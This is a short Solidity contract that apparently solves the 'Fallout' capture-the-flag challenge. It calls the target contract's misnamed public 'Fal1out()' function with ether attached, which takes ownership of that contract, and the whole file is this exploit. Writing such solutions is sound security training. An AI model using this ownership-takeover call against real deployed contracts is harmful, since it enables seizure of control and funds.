// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

contract ChallengeFallout {
    address payable falloutInstance;

    constructor(address payable _falloutInstance) {
        falloutInstance = _falloutInstance;
    }

    function assumeOwnership() external payable {
        bytes memory payload = abi.encodeWithSignature('Fal1out()');
        (bool success, ) = address(falloutInstance).call{value: msg.value}(payload);
        require(success);
    }
}